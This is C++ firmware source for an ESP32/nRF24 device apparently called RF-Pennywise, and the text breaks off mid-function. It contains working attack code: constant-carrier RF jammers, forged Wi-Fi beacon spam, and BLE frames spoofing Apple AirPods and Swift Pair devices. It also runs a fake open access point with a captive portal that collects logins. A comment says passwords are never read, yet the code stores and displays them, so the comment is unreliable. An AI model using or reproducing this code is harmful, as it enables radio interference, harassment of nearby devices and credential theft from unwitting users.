/* ____________________________
   This software is licensed under the MIT License:
   https://github.com/cifertech/rfclown

   RF-Pennywise by Cypher:
   https://github.com/cyph-zz/RF-Pennywise
   ________________________________________ */

#include "setting.h"
#include "config.h"

enum DeviceMode { MODE_JAM_SCAN, MODE_SCAN_ONLY };
static DeviceMode deviceMode = MODE_JAM_SCAN;

enum InfoUIState { INFO_IDLE, INFO_RADIOS, INFO_SYSTEM, INFO_SYSTEM2, INFO_BRIGHTNESS, INFO_DEVICE_MODE };

enum BrickwiseState { BW_IDLE, BW_PLAYING, BW_GAME_OVER };

enum SpectrumFilter { SPEC_FILTER_ALL, SPEC_FILTER_WIFI, SPEC_FILTER_BT, SPEC_FILTER_BLE, SPEC_FILTER_ZIGBEE };
static const int SPEC_FILTER_COUNT = 5;
static SpectrumFilter spectrumAioFilter = SPEC_FILTER_ALL;

enum MenuCategory { CAT_JAM, CAT_SCAN, CAT_SPECTRUM, CAT_TOOLS };
static const int CATEGORY_COUNT = 4;
static const char* kCategoryNames[CATEGORY_COUNT] = { "JAM", "SCAN", "SPECTRUM", "TOOLS" };

enum NavLevel { NAV_CATEGORY, NAV_CARD };
static NavLevel navLevel = NAV_CATEGORY;
static MenuCategory currentCategory = CAT_JAM;

#define ICON_BROWSER_MODE 0
#if ICON_BROWSER_MODE
static void runIconBrowser() {
  static int familyIdx = 0;
  static int glyphIdx = 0;
  const uint8_t* iconFonts[] = {
    u8g2_font_open_iconic_embedded_2x_t,
    u8g2_font_open_iconic_thing_2x_t,
    u8g2_font_open_iconic_gui_2x_t,
    u8g2_font_open_iconic_www_2x_t,
    u8g2_font_open_iconic_app_2x_t,
    u8g2_font_open_iconic_other_2x_t,
  };
  const char* iconFontNames[] = { "embedded", "thing", "gui", "www", "app", "other" };
  const int NUM_FAMILIES = 6;
  const int NUM_GLYPHS = 80;

  if (ChangeRequested)  { ChangeRequested  = false; glyphIdx = (glyphIdx - 1 + NUM_GLYPHS) % NUM_GLYPHS; }
  if (ChangeRequested1) { ChangeRequested1 = false; glyphIdx = (glyphIdx + 1) % NUM_GLYPHS; }
  if (ChangeRequested2) { ChangeRequested2 = false; familyIdx = (familyIdx + 1) % NUM_FAMILIES; glyphIdx = 0; }

  char c = (char)('A' + glyphIdx);
  u8g2.clearBuffer();
  u8g2.setFont(iconFonts[familyIdx]);
  char s[2] = { c, 0 };
  int gw = u8g2.getStrWidth(s);
  u8g2.setCursor((128 - gw) / 2, 4);
  u8g2.print(c);

  u8g2.setFont(FONT_SMALL);
  char info[32];
  snprintf(info, sizeof(info), "%s idx=%d '%c'", iconFontNames[familyIdx], glyphIdx, c);
  int iw = u8g2.getStrWidth(info);
  u8g2.setCursor((128 - iw) / 2, 54);
  u8g2.print(info);
  u8g2.sendBuffer();
  delay(50);
}
#endif

void IRAM_ATTR handleButton() {
  unsigned long currentTime = millis();
  if (currentTime - lastPressTime > debounceDelay) {
    ChangeRequested = true;
    lastPressTime = currentTime;
  }
}

void IRAM_ATTR handleButton1() {
  unsigned long currentTime = millis();
  if (currentTime - lastPressTime1 > debounceDelay) {
    ChangeRequested1 = true;
    lastPressTime1 = currentTime;
  }
}

void IRAM_ATTR handleButton2() {
  unsigned long currentTime = millis();
  if (currentTime - lastPressTime2 > debounceDelay) {
    ChangeRequested2 = true;
    lastPressTime2 = currentTime;
  }
}

void configure_Radio(RF24 &radio, const byte *channels, size_t size) {
  configureNrf(radio);
  radio.printPrettyDetails();
  if (deviceMode == MODE_SCAN_ONLY) return;
  for (size_t i = 0; i < size; i++) {
    radio.setChannel(channels[i]);
    radio.startConstCarrier(RF24_PA_MAX, channels[i]);
  }
}

void initialize_MultiMode() {
  if (RadioA.begin()) {
    configure_Radio(RadioA, channelGroup_1, sizeof(channelGroup_1));
  }
  if (RadioB.begin()) {
    configure_Radio(RadioB, channelGroup_2, sizeof(channelGroup_2));
  }
  if (RadioC.begin()) {
    configure_Radio(RadioC, channelGroup_3, sizeof(channelGroup_3));
  }
}

void initialize_Radios() {
  if (current == ACTIVE_MODE) {
    initialize_MultiMode();
  } else if (current == DEACTIVE_MODE) {
    setRadiosNeutralState();
    delay(100);
  }
}

static const uint8_t HEADER_H = 12;
static const uint8_t PAD      = 6;
static const uint8_t CARD_PAD = 1;
static const uint8_t CARD_H   = 48;
static const uint8_t CARD_CONTENT_H = 36;
static const uint8_t RADIUS   = 3;
static const uint8_t DOT_Y    = 64 - 7;

static const char* kMenuLabels[] = {
  "WiFi Jam", "Video TX Jam", "RC Jam", "BLE Jam", "BT Jam", "USB W Jam", "Zigbee Jam", "NRF24 Jam", "Beacon Spam", "BLE Spam", "WiFi Scan", "BT Scan", "BLE Scan", "Probe Sniff", "Traffic Mon", "BLE Spectrum", "WiFi Spectrum", "AIO Spectrum", "Spy Locate", "System", "BrickWise", "Honeypot"
};
static const int kMenuCount = sizeof(kMenuLabels)/sizeof(kMenuLabels[0]);

static int menuIndexFromMode(OperationMode m) {
  switch (m) {
    case WiFi_MODULE:         return 0;
    case VIDEO_TX_MODULE:     return 1;
    case RC_MODULE:           return 2;
    case BLE_MODULE:          return 3;
    case Bluetooth_MODULE:    return 4;
    case USB_WIRELESS_MODULE: return 5;
    case ZIGBEE_MODULE:       return 6;
    case NRF24_MODULE:        return 7;
    case BEACON_SPAM_MODULE:  return 8;
    case BLE_SPAM_MODULE:     return 9;
    case WIFI_SCANNER_MODULE: return 10;
    case BT_SCANNER_MODULE:   return 11;
    case BLE_SCANNER_MODULE:  return 12;
    case PROBE_SNIFFER_MODULE: return 13;
    case TRAFFIC_MON_MODULE:   return 14;
    case BLE_SPECTRUM_MODULE: return 15;
    case WIFI_SPECTRUM_MODULE: return 16;
    case SPECTRUM_AIO_MODULE:  return 17;
    case SPY_LOCATE_MODULE:    return 18;
    case INFO_MODULE:          return 19;
    case BRICKWISE_MODULE:     return 20;
    case HONEYPOT_MODULE:      return 21;
    default: return 0;
  }
}
static OperationMode modeFromMenuIndex(int idx) {
  switch (idx) {
    case 0: return WiFi_MODULE;
    case 1: return VIDEO_TX_MODULE;
    case 2: return RC_MODULE;
    case 3: return BLE_MODULE;
    case 4: return Bluetooth_MODULE;
    case 5: return USB_WIRELESS_MODULE;
    case 6: return ZIGBEE_MODULE;
    case 7: return NRF24_MODULE;
    case 8: return BEACON_SPAM_MODULE;
    case 9: return BLE_SPAM_MODULE;
    case 10: return WIFI_SCANNER_MODULE;
    case 11: return BT_SCANNER_MODULE;
    case 12: return BLE_SCANNER_MODULE;
    case 13: return PROBE_SNIFFER_MODULE;
    case 14: return TRAFFIC_MON_MODULE;
    case 15: return BLE_SPECTRUM_MODULE;
    case 16: return WIFI_SPECTRUM_MODULE;
    case 17: return SPECTRUM_AIO_MODULE;
    case 18: return SPY_LOCATE_MODULE;
    case 19: return INFO_MODULE;
    case 20: return BRICKWISE_MODULE;
    case 21: return HONEYPOT_MODULE;
    default: return WiFi_MODULE;
  }
}

static const int SCAN_ROWS_PER_PAGE = 4;
static const uint32_t BT_SCAN_TIMEOUT_MS = 3000;
static const uint32_t BLE_SCAN_DURATION_S = 2;

static int wifiScanCount = 0;
static int wifiScanPage  = 0;

static int btScanCount = 0;
static int btScanPage  = 0;
static BTScanResults* btResults = nullptr;

static int bleScanCount = 0;
static int bleScanPage  = 0;
static BLEScanResults bleResults;

static BluetoothSerial SerialBT;

static int locateChannel = 40;

static bool isInfoMode(OperationMode m) {
  return m == INFO_MODULE;
}

static bool isScannerMode(OperationMode m) {
  return m == WIFI_SCANNER_MODULE || m == BT_SCANNER_MODULE || m == BLE_SCANNER_MODULE || m == PROBE_SNIFFER_MODULE;
}

static bool isBrickwiseMode(OperationMode m) {
  return m == BRICKWISE_MODULE;
}

static bool isJammerMode(OperationMode m) {
  return !isScannerMode(m) && !isInfoMode(m) && !isBrickwiseMode(m) &&
         m != BLE_SPECTRUM_MODULE && m != WIFI_SPECTRUM_MODULE && m != SPECTRUM_AIO_MODULE &&
         m != SPY_LOCATE_MODULE && m != BEACON_SPAM_MODULE && m != BLE_SPAM_MODULE &&
         m != TRAFFIC_MON_MODULE && m != HONEYPOT_MODULE;
}

// Modes that emit disruptively (nRF24 jamming or WiFi/BLE spam) and must be
// hidden/blocked in MODE_SCAN_ONLY, without pulling BEACON_SPAM_MODULE/BLE_SPAM_MODULE
// into the nRF24-specific activation logic that isJammerMode() drives.
static bool isDisruptiveMode(OperationMode m) {
  return isJammerMode(m) || m == BEACON_SPAM_MODULE || m == BLE_SPAM_MODULE || m == HONEYPOT_MODULE;
}

static MenuCategory categoryOfMode(OperationMode m) {
  if (m == HONEYPOT_MODULE) return CAT_TOOLS;
  if (isDisruptiveMode(m)) return CAT_JAM;
  if (isScannerMode(m) || m == TRAFFIC_MON_MODULE) return CAT_SCAN;
  if (m == BLE_SPECTRUM_MODULE || m == WIFI_SPECTRUM_MODULE || m == SPECTRUM_AIO_MODULE || m == SPY_LOCATE_MODULE) return CAT_SPECTRUM;
  return CAT_TOOLS; // INFO_MODULE, BRICKWISE_MODULE
}

static int firstMenuIndexInCategory(MenuCategory cat) {
  for (int i = 0; i < kMenuCount; i++) {
    if (categoryOfMode(modeFromMenuIndex(i)) == cat) return i;
  }
  return 0;
}

static int lastMenuIndexInCategory(MenuCategory cat) {
  for (int i = kMenuCount - 1; i >= 0; i--) {
    if (categoryOfMode(modeFromMenuIndex(i)) == cat) return i;
  }
  return kMenuCount - 1;
}

static bool isCategoryHidden(MenuCategory cat) {
  return cat == CAT_JAM && deviceMode == MODE_SCAN_ONLY;
}

static MenuCategory nextVisibleCategory(MenuCategory cat, int direction) {
  int idx = (int)cat;
  for (int step = 0; step < CATEGORY_COUNT; step++) {
    idx = (idx + direction + CATEGORY_COUNT) % CATEGORY_COUNT;
    if (!isCategoryHidden((MenuCategory)idx)) break;
  }
  return (MenuCategory)idx;
}

static const uint8_t BRIGHTNESS_STEP = 25;
static InfoUIState infoState = INFO_IDLE;
static bool infoEditing = false;

static InfoUIState nextInfoScreen(InfoUIState s, int dir) {
  int idx = (int)s - (int)INFO_RADIOS;
  int count = (int)INFO_DEVICE_MODE - (int)INFO_RADIOS + 1;
  idx = (idx + dir + count) % count;
  return (InfoUIState)((int)INFO_RADIOS + idx);
}

static int wifiScanTotalPages() {
  if (wifiScanCount <= 0) return 1;
  return (wifiScanCount + SCAN_ROWS_PER_PAGE - 1) / SCAN_ROWS_PER_PAGE;
}
static int btScanTotalPages() {
  if (btScanCount <= 0) return 1;
  return (btScanCount + SCAN_ROWS_PER_PAGE - 1) / SCAN_ROWS_PER_PAGE;
}
static int bleScanTotalPages() {
  if (bleScanCount <= 0) return 1;
  return (bleScanCount + SCAN_ROWS_PER_PAGE - 1) / SCAN_ROWS_PER_PAGE;
}

void spectrum() {
  const uint8_t HDR_H = 10;
  const int TOP = HDR_H + 12;
  const int BOT = SCREEN_H - 2;
  const int H   = BOT - TOP;
  const int STRIDE = 3;
  const int BINS   = SCREEN_W / STRIDE;
  const int BAR_W  = 1;
  static uint8_t h[BINS];
  static int8_t  v[BINS];
  static bool init = false;
  if (!init) {
    for (int i = 0; i < BINS; ++i) {
      h[i] = random(0, H + 1);
      v[i] = random(-2, 3);
    }
    init = true;
  }
  for (int i = 0; i < BINS; ++i) {
    int8_t a = (int8_t)random(-1, 2);
    v[i] += a;
    if (v[i] > 3) v[i] = 3;
    if (v[i] < -3) v[i] = -3;
    int16_t nh = (int16_t)h[i] + v[i];
    if (nh < 0) {
      nh = 0;
      v[i] = -(v[i] * 3) / 4;
      if (v[i] == 0) v[i] = 1;
    } else if (nh > H) {
      nh = H;
      v[i] = -(v[i] * 3) / 4;
      if (v[i] == 0) v[i] = -1;
    }
    h[i] = (uint8_t)nh;
  }
  for (int i = 0; i < BINS; ++i) {
    int x  = i * STRIDE;
    int bh = h[i];
    if (bh <= 0) continue;
    int y  = BOT - bh;
    u8g2.drawVLine(x, y, bh);
  }
  u8g2.sendBuffer();
}

static void drawHeaderBar() {
  const uint8_t W = 128;
  const uint8_t H = HEADER_H;
  const uint8_t TXT_Y = 2;
  u8g2.setDrawColor(1);
  u8g2.drawBox(0, 0, W, H);
  u8g2.setFont(FONT_SMALL);
  u8g2.setDrawColor(0);
  u8g2.drawStr(PAD, TXT_Y, "RF-Pennywise");
  const char* ver = "v2.0.0";
  int vw = u8g2.getStrWidth(ver);
  u8g2.drawStr(W - vw - 4, TXT_Y, ver);
  u8g2.setDrawColor(1);
  u8g2.drawHLine(0, H - 1, W);
}

static void runWifiScan() {
  WiFi.mode(WIFI_STA);
  int n = WiFi.scanNetworks(false, true);
  wifiScanCount = (n > 0) ? n : 0;
}

static void renderWifiScanResults(int page) {
  u8g2.clearBuffer();
  drawHeaderBar();
  u8g2.setFont(FONT_SMALL);

  if (wifiScanCount <= 0) {
    u8g2.setCursor(10, 30);
    u8g2.print("No network found");
    u8g2.sendBuffer();
    return;
  }

  int start = page * SCAN_ROWS_PER_PAGE;
  int end   = min(start + SCAN_ROWS_PER_PAGE, wifiScanCount);

  int y = HEADER_H + 3;
  for (int i = start; i < end; i++) {
    String ssidStr = WiFi.SSID(i);
    if (ssidStr.length() == 0) ssidStr = "(hidden)";
    if (ssidStr.length() > 13) ssidStr = ssidStr.substring(0, 13);
    bool wps = false;
    wifi_ap_record_t* rec = (wifi_ap_record_t*)WiFi.getScanInfoByIndex(i);
    if (rec) wps = rec->wps;
    char line[32];
    snprintf(line, sizeof(line), "%-13s%3d%5d%s", ssidStr.c_str(), WiFi.channel(i), WiFi.RSSI(i),
             wps ? "W" : " ");
    u8g2.setCursor(2, y);
    u8g2.print(line);
    y += 10;
  }

  u8g2.setCursor(2, SCREEN_H - 8);
  u8g2.print("W=WPS");

  char footer[24];
  snprintf(footer, sizeof(footer), "Page %d/%d", page + 1, wifiScanTotalPages());
  u8g2.setCursor(128 - u8g2.getStrWidth(footer) - 2, SCREEN_H - 8);
  u8g2.print(footer);

  u8g2.sendBuffer();
}

static const char* kBeaconSpamSsids[] = {
  "Free Public WiFi", "FBI Surveillance Van", "Pretty Fly for a WiFi",
  "Virus.exe", "Definitely Not a Trap", "Get Off My LAN", "404 Network Unavailable",
  "Mom Click Here", "Loading...", "It Hurts When IP"
};
static const int BEACON_SPAM_SSID_COUNT = sizeof(kBeaconSpamSsids) / sizeof(kBeaconSpamSsids[0]);
static unsigned long beaconSpamCount = 0;
static int beaconSpamSsidIdx = 0;
static esp_err_t beaconChErr = ESP_OK;
static esp_err_t beaconTxErr = ESP_OK;

static void sendBeaconSpamBurst() {
  WiFi.mode(WIFI_STA);

  // Stay on one channel for a few seconds at a time so a phone's scan sweep
  // has a real chance to land on it while we're still broadcasting there,
  // instead of hopping every SSID and missing every scan window.
  uint8_t channel = (uint8_t)((millis() / 3000) % 11) + 1;
  beaconChErr = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

  uint8_t frame[128] = {
    0x80, 0x00,                          // Frame Control: Management, subtype Beacon
    0x00, 0x00,                          // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Addr1: broadcast (destination)
    0, 0, 0, 0, 0, 0,                    // Addr2: BSSID (random, filled below)
    0, 0, 0, 0, 0, 0,                    // Addr3: BSSID
    0x00, 0x00,                          // Sequence control
    0, 0, 0, 0, 0, 0, 0, 0,              // Timestamp
    0x64, 0x00,                          // Beacon interval
    0x01, 0x00,                          // Capability info: ESS
  };

  for (int n = 0; n < BEACON_SPAM_SSID_COUNT; n++) {
    beaconSpamSsidIdx = n;
    const char* ssid = kBeaconSpamSsids[n];
    uint8_t ssidLen = strlen(ssid);

    uint8_t bssid[6] = { 0x02, (uint8_t)random(256), (uint8_t)random(256),
                          (uint8_t)random(256), (uint8_t)random(256), (uint8_t)random(256) };
    memcpy(&frame[10], bssid, 6);
    memcpy(&frame[16], bssid, 6);

    int pos = 36;
    frame[pos++] = 0x00; frame[pos++] = ssidLen;      // SSID tag
    memcpy(&frame[pos], ssid, ssidLen); pos += ssidLen;

    frame[pos++] = 0x01; frame[pos++] = 4;            // Supported rates tag
    frame[pos++] = 0x82; frame[pos++] = 0x84; frame[pos++] = 0x8B; frame[pos++] = 0x96;

    frame[pos++] = 0x03; frame[pos++] = 1;            // DS Parameter Set (channel)
    frame[pos++] = channel;

    beaconTxErr = esp_wifi_80211_tx(WIFI_IF_STA, frame, pos, false);
    beaconSpamCount++;
  }
}

static void renderBeaconSpamFrame() {
  u8g2.clearBuffer();
  drawHeaderBar();

  u8g2.setFont(FONT_MEDIUM);
  const char* title = "Beacon Spam";
  int tw = u8g2.getStrWidth(title);
  u8g2.setCursor((SCREEN_W - tw) / 2, HEADER_H + 4);
  u8g2.print(title);

  u8g2.setFont(FONT_SMALL);
  char last[20];
  snprintf(last, sizeof(last), "%.14s", kBeaconSpamSsids[beaconSpamSsidIdx]);
  int lw = u8g2.getStrWidth(last);
  u8g2.setCursor((SCREEN_W - lw) / 2, HEADER_H + 22);
  u8g2.print(last);

  char cnt[24];
  snprintf(cnt, sizeof(cnt), "%lu sent  ch%d", beaconSpamCount, (int)((millis() / 3000) % 11) + 1);
  int cw = u8g2.getStrWidth(cnt);
  u8g2.setCursor((SCREEN_W - cw) / 2, HEADER_H + 33);
  u8g2.print(cnt);

  char dbg[24];
  snprintf(dbg, sizeof(dbg), "ch=%d tx=%d", beaconChErr, beaconTxErr);
  int dw = u8g2.getStrWidth(dbg);
  u8g2.setCursor((SCREEN_W - dw) / 2, HEADER_H + 44);
  u8g2.print(dbg);

  u8g2.sendBuffer();
}

// Apple Continuity Protocol - Proximity Pairing message (type 0x07), spoofs
// AirPods-family devices to trigger the iOS pairing popup animation.
struct AppleModel {
  const char* name;
  uint16_t id;
};
static const AppleModel kAppleModels[] = {
  { "AirPods Pro",   0x0E20 },
  { "AirPods Max",   0x0A20 },
  { "AirPods",       0x0220 },
  { "AirPods 3",     0x1320 },
  { "Beats Solo3",   0x0620 },
};
static const int APPLE_MODEL_COUNT = sizeof(kAppleModels) / sizeof(kAppleModels[0]);

static const char* kSwiftPairNames[] = {
  "Not a Virus", "Bluetooth Speaker", "Free AirPods", "Definitely Legit"
};
static const int SWIFTPAIR_NAME_COUNT = sizeof(kSwiftPairNames) / sizeof(kSwiftPairNames[0]);

static unsigned long bleSpamCount = 0;
static int bleSpamModelIdx = 0;
static bool bleSpamInited = false;
static bool bleSpamUseSwiftPair = false;
static char bleSpamLastLabel[24] = "";

static void startBleSpam() {
  if (!bleSpamInited) {
    BLEDevice::init("");
    bleSpamInited = true;
  }
}

static void bleGapAdvertiseRaw(uint8_t* adv, int len) {
  esp_bd_addr_t randomAddr;
  for (int i = 0; i < 6; i++) randomAddr[i] = (uint8_t)random(256);
  randomAddr[0] = (randomAddr[0] & 0x3F) | 0xC0; // mark as static random address
  esp_ble_gap_set_rand_addr(randomAddr);

  esp_ble_gap_config_adv_data_raw(adv, len);

  esp_ble_adv_params_t advParams = {};
  advParams.adv_int_min = 0x20;
  advParams.adv_int_max = 0x40;
  advParams.adv_type = ADV_TYPE_NONCONN_IND;
  advParams.own_addr_type = BLE_ADDR_TYPE_RANDOM;
  advParams.channel_map = ADV_CHNL_ALL;
  advParams.adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY;
  esp_ble_gap_start_advertising(&advParams);

  delay(500);
  esp_ble_gap_stop_advertising();
  bleSpamCount++;
}

// Apple Continuity Protocol - Proximity Pairing (type 0x07): spoofs AirPods
// models to trigger the iOS pairing popup. Undocumented/reverse-engineered
// protocol - best effort, Apple has hardened parsing since this went public.
static void sendAppleSpamBurst() {
  bleSpamModelIdx = (bleSpamModelIdx + 1) % APPLE_MODEL_COUNT;
  uint16_t model = kAppleModels[bleSpamModelIdx].id;
  snprintf(bleSpamLastLabel, sizeof(bleSpamLastLabel), "%.16s", kAppleModels[bleSpamModelIdx].name);

  uint8_t payload[25];
  payload[0] = 0x01;                 // Prefix
  payload[1] = (uint8_t)(model >> 8);
  payload[2] = (uint8_t)(model & 0xFF);
  payload[3] = 0x55;                 // Status
  for (int i = 4; i < (int)sizeof(payload); i++) payload[i] = (uint8_t)random(256); // encrypted payload: randomized, not all-zero

  uint8_t adv[31];
  int pos = 0;
  adv[pos++] = 1 + 2 + 1 + 1 + sizeof(payload); // AD length: type + companyID(2) + msgType + msgLen + payload
  adv[pos++] = 0xFF;                            // AD type: Manufacturer Specific Data
  adv[pos++] = 0x4C; adv[pos++] = 0x00;         // Apple company ID (little-endian)
  adv[pos++] = 0x07;                            // Continuity type: Proximity Pairing
  adv[pos++] = sizeof(payload);                 // Message length
  memcpy(&adv[pos], payload, sizeof(payload));
  pos += sizeof(payload);

  bleGapAdvertiseRaw(adv, pos);
}

// Microsoft Swift Pair beacon (officially documented, service UUID 0xFE2C):
// triggers the "new device found" toast on Windows, and Fast Pair-compatible
// notifications on some Android phones.
static void sendSwiftPairBurst() {
  int nameIdx = bleSpamModelIdx % SWIFTPAIR_NAME_COUNT;
  const char* name = kSwiftPairNames[nameIdx];
  uint8_t nameLen = strlen(name);
  snprintf(bleSpamLastLabel, sizeof(bleSpamLastLabel), "%.16s", name);

  uint8_t adv[31];
  int pos = 0;
  adv[pos++] = 0x02; adv[pos++] = 0x01; adv[pos++] = 0x06; // AD: Flags

  uint8_t svcLen = 1 + 2 + 1 + nameLen; // type + uuid(2) + beaconType + name
  adv[pos++] = svcLen;
  adv[pos++] = 0x16;                     // AD: Service Data - 16-bit UUID
  adv[pos++] = 0x2C; adv[pos++] = 0xFE;  // UUID 0xFE2C (Swift Pair), little-endian
  adv[pos++] = 0x00;                     // Beacon Action Type: Pairing
  memcpy(&adv[pos], name, nameLen);
  pos += nameLen;

  bleGapAdvertiseRaw(adv, pos);
}

static void sendBleSpamBurst() {
  startBleSpam();
  if (bleSpamUseSwiftPair) {
    sendSwiftPairBurst();
  } else {
    sendAppleSpamBurst();
  }
  bleSpamUseSwiftPair = !bleSpamUseSwiftPair;
}

static void renderBleSpamFrame() {
  u8g2.clearBuffer();
  drawHeaderBar();

  u8g2.setFont(FONT_MEDIUM);
  const char* title = "BLE Spam";
  int tw = u8g2.getStrWidth(title);
  u8g2.setCursor((SCREEN_W - tw) / 2, HEADER_H + 4);
  u8g2.print(title);

  u8g2.setFont(FONT_SMALL);
  const char* proto = bleSpamUseSwiftPair ? "Apple" : "SwiftPair"; // already flipped after send
  char last[28];
  snprintf(last, sizeof(last), "%s: %s", proto, bleSpamLastLabel);
  int lw = u8g2.getStrWidth(last);
  u8g2.setCursor((SCREEN_W - lw) / 2, HEADER_H + 24);
  u8g2.print(last);

  char cnt[24];
  snprintf(cnt, sizeof(cnt), "%lu sent", bleSpamCount);
  int cw = u8g2.getStrWidth(cnt);
  u8g2.setCursor((SCREEN_W - cw) / 2, HEADER_H + 38);
  u8g2.print(cnt);

  u8g2.sendBuffer();
}

// Awareness honeypot: fake open AP + captive portal, to demonstrate how
// easily a device (and its user) walks into a credential-phishing page.
// The password field is deliberately never read - only the login/username
// is captured and shown, to make the point without harvesting real secrets.
static WebServer honeypotServer(80);
static DNSServer honeypotDns;
static bool honeypotRunning = false;

struct HoneypotCapture {
  char login[20];
  char password[20];
};
static const int HONEYPOT_MAX = 10;
static const int HONEYPOT_ROWS_PER_PAGE = 2;
static HoneypotCapture honeypotCaptures[HONEYPOT_MAX];
static int honeypotCaptureCount = 0;
static int honeypotPage = 0;

// AP name selection: a preset list, plus a "Custom..." slot (last index)
// that opens a character-by-character editor.
static const char* kHoneypotPresets[] = {
  "Free Public WiFi", "Cafe WiFi", "Airport_Guest", "Hotel_Guest"
};
static const int HONEYPOT_PRESET_COUNT = sizeof(kHoneypotPresets) / sizeof(kHoneypotPresets[0]);
static int honeypotSsidPresetIdx = 0; // 0..HONEYPOT_PRESET_COUNT-1 = preset, ==COUNT = custom

static const char kHoneypotEditCharset[] =
  " ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
static const int HONEYPOT_EDIT_CHARSET_LEN = sizeof(kHoneypotEditCharset) - 1;
static const int HONEYPOT_EDIT_META_DEL  = HONEYPOT_EDIT_CHARSET_LEN;
static const int HONEYPOT_EDIT_META_DONE = HONEYPOT_EDIT_CHARSET_LEN + 1;
static const int HONEYPOT_EDIT_TOTAL     = HONEYPOT_EDIT_CHARSET_LEN + 2;

static char honeypotCustomSsid[24] = "Custom WiFi";
static bool honeypotEditingSsid = false;
static int honeypotEditLen = 0;
static int honeypotEditCharIdx = 0;

// Config screen: press center on the idle card to open it (does not
// touch the shared L/R menu navigation), pick a preset/Custom/Cancel,
// then it launches the honeypot directly.
static bool honeypotConfigOpen = false;
static int honeypotConfigTotal() { return HONEYPOT_PRESET_COUNT + 2; } // presets + Custom + Cancel

static const char* honeypotSelectedSsidName() {
  if (honeypotSsidPresetIdx < HONEYPOT_PRESET_COUNT) return kHoneypotPresets[honeypotSsidPresetIdx];
  return honeypotCustomSsid;
}

static const char* kHoneypotPage =
  "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>"
  "<title>WiFi Login</title></head>"
  "<body style='font-family:sans-serif;text-align:center;padding-top:40px;'>"
  "<h2>Network Login Required</h2>"
  "<form method='POST' action='/login'>"
  "<input name='login' placeholder='Username' style='padding:8px;margin:6px;'><br>"
  "<input name='password' type='password' placeholder='Password' style='padding:8px;margin:6px;'><br>"
  "<button type='submit' style='padding:8px 20px;'>Connect</button>"
  "</form></body></html>";

static void honeypotHandleRoot() {
  honeypotServer.send(200, "text/html", kHoneypotPage);
}

static void honeypotHandlePassword(HoneypotCapture* entry) {
  if (honeypotServer.hasArg("password")) {
    honeypotServer.arg("password").toCharArray(entry->password, sizeof(entry->password));
  }
}

static void honeypotHandleLogin() {
  if (honeypotCaptureCount < HONEYPOT_MAX) {
    HoneypotCapture* entry = &honeypotCaptures[honeypotCaptureCount];
    entry->login[0] = '\0';
    entry->password[0] = '\0';
    if (honeypotServer.hasArg("login")) {
      honeypotServer.arg("login").toCharArray(entry->login, sizeof(entry->login));
    }
    honeypotHandlePassword(entry);
    honeypotCaptureCount++;
  }
  honeypotServer.send(200, "text/html",
    "<html><body style='font-family:sans-serif;text-align:center;padding-top:40px;'>"
    "<h3>Connection failed. Please try again.</h3></body></html>");
}

static void honeypotHandleNotFound() {
  honeypotServer.sendHeader("Location", String("http://") + WiFi.softAPIP().toString() + "/", true);
  honeypotServer.send(302, "text/plain", "");
}

static void startHoneypot() {
  WiFi.mode(WIFI_AP);
  WiFi.softAP(honeypotSelectedSsidName());
  honeypotDns.start(53, "*", WiFi.softAPIP());
  honeypotServer.on("/", honeypotHandleRoot);
  honeypotServer.on("/login", HTTP_POST, honeypotHandleLogin);
  honeypotServer.onNotFound(honeypotHandleNotFound);
  honeypotServer.begin();
  honeypotRunning = true;
  honeypotCaptureCount = 0;
  honeypotPage = 0;
}

static void stopHoneypot() {
  honeypotServer.stop();
  honeypotDns.stop();
  WiFi.softAPdisconnect(true);
  honeypotRunning = false;
}

static int honeypotTotalPages() {
  if (honeypotCaptureCount <= 0) return 1;
  return (honeypotCaptureCount + HONEYPOT_ROWS_PER_PAGE - 1) / HONEYPOT_ROWS_PER_PAGE;
}

static void renderHoneypotHistory(int page) {
  u8g2.clearBuffer();
  drawHeaderBar();
  u8g2.setFont(FONT_SMALL);

  char hdr[24];
  snprintf(hdr, sizeof(hdr), "%d client(s)  %d cap.", WiFi.softAPgetStationNum(), honeypotCaptureCount);
  u8g2.setCursor(2, HEADER_H + 2);
  u8g2.print(hdr);

  char pageStr[8];
  snprintf(pageStr, sizeof(pageStr), "%d/%d", page + 1, honeypotTotalPages());
  int psw = u8g2.getStrWidth(pageStr);
  u8g2.setCursor(SCREEN_W - psw - 2, HEADER_H + 2);
  u8g2.print(pageStr);

  u8g2.drawHLine(0, HEADER_H + 11, SCREEN_W);

  if (honeypotCaptureCount <= 0) {
    u8g2.setCursor(10, HEADER_H + 26);
    u8g2.print("No captures yet");
    u8g2.sendBuffer();
    return;
  }

  int start = page * HONEYPOT_ROWS_PER_PAGE;
  int end   = min(start + HONEYPOT_ROWS_PER_PAGE, honeypotCaptureCount);

  int y = HEADER_H + 15;
  for (int i = start; i < end; i++) {
    char line1[24];
    snprintf(line1, sizeof(line1), "#%d L:%s", i + 1, honeypotCaptures[i].login[0] ? honeypotCaptures[i].login : "-");
    u8g2.setCursor(2, y);
    u8g2.print(line1);
    y += 9;

    char line2[24];
    snprintf(line2, sizeof(line2), "   P:%s", honeypotCaptures[i].password[0] ? honeypotCaptures[i].password : "-");
    u8g2.setCursor(2, y);
    u8g2.print(line2);
    y += 9;
  }

  u8g2.sendBuffer();
}

static void renderHoneypotSsidEditor() {
  u8g2.clearBuffer();
  drawHeaderBar();

  u8g2.setFont(FONT_SMALL);
  u8g2.setCursor(2, HEADER_H + 2);
  u8g2.print("Enter AP name:");

  char preview[sizeof(honeypotCustomSsid)];
  memcpy(preview, honeypotCustomSsid, honeypotEditLen);
  preview[honeypotEditLen] = '\0';

  u8g2.setFont(FONT_MEDIUM);
  int pw = u8g2.getStrWidth(preview);
  u8g2.setCursor(4, HEADER_H + 18);
  u8g2.print(preview);
  u8g2.drawBox(4 + pw, HEADER_H + 28, 6, 2);

  u8g2.setFont(FONT_SMALL);
  char cur[16];
  if (honeypotEditCharIdx == HONEYPOT_EDIT_META_DEL) {
    snprintf(cur, sizeof(cur), "< DEL");
  } else if (honeypotEditCharIdx == HONEYPOT_EDIT_META_DONE) {
    snprintf(cur, sizeof(cur), "OK SAVE");
  } else {
    snprintf(cur, sizeof(cur), "[ %c ]", kHoneypotEditCharset[honeypotEditCharIdx]);
  }
  int cw = u8g2.getStrWidth(cur);
